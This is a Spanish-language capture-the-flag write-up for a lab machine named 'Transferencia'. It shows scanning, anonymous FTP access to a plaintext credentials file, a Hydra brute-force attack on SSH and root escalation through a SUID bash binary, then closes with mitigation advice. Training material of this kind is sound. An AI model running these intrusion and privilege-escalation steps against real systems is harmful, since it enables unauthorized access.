# 🔐 CTF: Análisis de Seguridad - Máquina "Transferencia"
### Comprometiendo Sistemas a través de FTP Anónimo y Escalada de Privilegios

**Estudiante:** Dante  
**Fecha:** 2 de diciembre de 2025  
**Plataforma:** [Whoami Labs](https://whoami-labs.com/laboratorios)  
**IP Objetivo:** 172.17.0.2  

---

## 📋 Índice
1. [Resumen Ejecutivo](#-resumen-ejecutivo)
2. [Reconocimiento Inicial](#-reconocimiento-inicial)
3. [Explotación FTP Anónimo](#-explotación-ftp-anónimo)
4. [Ataque de Fuerza Bruta SSH](#-ataque-de-fuerza-bruta-ssh)
5. [Acceso al Sistema](#-acceso-al-sistema)
6. [Escalada de Privilegios](#-escalada-de-privilegios)
7. [Captura de la Bandera](#-captura-de-la-bandera)
8. [Análisis de Vulnerabilidades](#-análisis-de-vulnerabilidades)
9. [Contenido del Repositorio](#-contenido-del-repositorio)

---

## 📊 Resumen Ejecutivo
Este documento detalla el proceso completo de comprometer la máquina "Transferencia", identificando múltiples vulnerabilidades de seguridad que permitieron obtener acceso no autorizado y escalar privilegios hasta comprometer completamente el sistema.

**Tiempo total de explotación:** 15 minutos  
**Vulnerabilidades identificadas:** 3 críticas  
**Dificultad:** Media-Baja  

### Hallazgos Principales:
1. ✅ **FTP con autenticación anónima** habilitada
2. ✅ **Archivo con credenciales** en texto plano
3. ✅ **Binario SUID** mal configurado (bash)
4. ✅ **Contraseñas débiles** y reutilizadas

---

## 🔍 Reconocimiento Inicial

### Escaneo Básico de Puertos
```bash
nmap 172.17.0.2
Resultados:

PORT   STATE SERVICE
21/tcp open  ftp     ← ¡Potencial punto de entrada!
22/tcp open  ssh     ← Servicio de administración
80/tcp open  http    ← Servicio web
## Escaneo Profundo con Detección de Servicios.
sudo nmap -sS -sV -sC -p 21,22,80 -T4 -oN scaneo-profundo.txt 172.17.0.2
Hallazgos Clave:

FTP (21): vsftpd 3.0.5 con login anónimo permitido

SSH (22): OpenSSH 10.0p2 Debian 7

HTTP (80): Servidor nginx con título "Transferencia"
📁 Explotación FTP Anónimo
Verificación de Acceso Anónimo
sudo nmap -p 21 --script ftp-anon,ftp-syst -oN scans_ftp.txt 172.17.0.2
Confirmación:
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    1 65534    65534        4096 Nov 27 03:15 pub
Conexión FTP y Exploración
ftp 172.17.0.2
Name: anonymous
Password: anonymous
Estructura del FTP:
ftp> ls -all
drwxr-xr-x    1 65534    65534        4096 Nov 27 03:15 .
drwxr-xr-x    1 65534    65534        4096 Nov 27 03:15 ..
drwxr-xr-x    1 65534    65534        4096 Nov 27 03:15 pub

ftp> cd pub
ftp> ls -all
-rw-r--r--    1 0        0              81 Nov 27 03:15 usuarios.txt
Descarga del Archivo Crítico
ftp> get usuarios.txt
## Contenido de usuarios.txt:

carlos:qwerty
maria:123456
guest:guest
admin:admin
test:user123
alberto:admin123

⚠️ Descubrimiento crítico: Archivo con credenciales en texto plano expuesto públicamente.

⚡ Ataque de Fuerza Bruta SSH
Utilización de Hydra con Credenciales Obtenidas
hydra -C usuarios.txt ssh://172.17.0.2
Resultado Exitoso:
[22][ssh] host: 172.17.0.2   login: alberto   password: admin123
1 of 1 target successfully completed, 1 valid password found

Análisis de las Credenciales
Usuario	Contraseña	Estado	Seguridad
carlos	qwerty	❌ Falló	Muy débil
maria	123456	❌ Falló	Extremadamente débil
guest	guest	❌ Falló	Débil (usuario=contraseña)
admin	admin	❌ Falló	Débil (usuario=contraseña)
test	user123	❌ Falló	Moderada
alberto	admin123	✅ ÉXITO	Débil (patrón común)

## 🔓 Acceso al Sistema
Conexión SSH con Credenciales Válidas

sudo ssh alberto@172.17.0.2
Password: admin123
Confirmación de Acceso:

-bash-5.2$ whoami
alberto

-bash-5.2$ ls -all
total 28
drwx------ 1 alberto alberto 4096 Dec  3 14:46 .
drwxr-xr-x 1 root    root    4096 Nov 27 03:15 ..
-rw------- 1 alberto alberto    5 Dec  3 14:46 .bash_history
-rw-r--r-- 1 alberto alberto  220 Jul 30 19:28 .bash_logout
-rw-r--r-- 1 alberto alberto 3526 Jul 30 19:28 .bashrc
-rw-r--r-- 1 alberto alberto  807 Jul 30 19:28 .profile

⬆️ Escalada de Privilegios
Búsqueda de Binarios SUID
find / -perm -4000 2>/dev/null

Binarios SUID Encontrados:

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/exim4
/usr/bin/passwd
/usr/bin/umount
/usr/bin/bash        ← ¡VULNERABLE!
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo

Explotación de Bash SUID

/usr/bin/bash -p

Confirmación de Escalada:
bash-5.2# whoami
root
⚠️ Vulnerabilidad crítica: Bash configurado con bit SUID permite escalada directa a root.

🏴 Captura de la Bandera
Exploración del Directorio Root

bash-5.2# ls -all
total 24
drwx------ 1 root root 4096 Nov 27 03:15 .
drwxr-xr-x 1 root root 4096 Dec  3 14:25 ..
-rw-r--r-- 1 root root  607 Nov  7 17:40 .bashrc
-rw-r--r-- 1 root root  132 Nov  7 17:40 .profile
drwx------ 2 root root 4096 Nov 27 03:15 .ssh
-rw------- 1 root root   12 Nov 27 03:15 flag.txt

Lectura de la Bandera
@n0n_h@CKEr


🔬 Análisis de Vulnerabilidades
Vulnerabilidades Identificadas
#	Vulnerabilidad	Severidad	Impacto
1	FTP Anónimo habilitado	Alta	Exposición de datos sensibles
2	Credenciales en texto plano	Crítica	Acceso no autorizado inmediato
3	Contraseñas débiles	Media	Fácil fuerza bruta
4	Binario bash con SUID	Crítica	Escalada completa a root
5	Falta de segmentación	Media	Acceso lateral facilitado
Recomendaciones de Mitigación
🔧 Correcciones Inmediatas:
Deshabilitar FTP anónimo en vsftpd:

bash
# /etc/vsftpd.conf
anonymous_enable=NO
Eliminar archivos con credenciales de directorios públicos

Política de contraseñas robustas:

Mínimo 12 caracteres

Combinación de mayúsculas, minúsculas, números y símbolos

Prohibir contraseñas comunes o relacionadas al usuario

Revisar y eliminar SUID innecesarios:

bash


🛡️ Mejoras de Seguridad:
Implementar fail2ban para SSH y FTP

Habilitar autenticación por clave SSH (deshabilitar contraseña)

Segmentar servicios en redes diferentes

Monitoreo de logs para intentos de acceso

Lecciones Aprendidas
Exposición de datos: Archivos "temporales" o "de prueba" suelen quedar expuestos

Configuraciones por defecto: Los servicios con configuración por defecto son peligrosos

Defensa en profundidad: Múltiples fallos de seguridad se encadenaron

Principio del menor privilegio: Bash nunca debería tener SUID
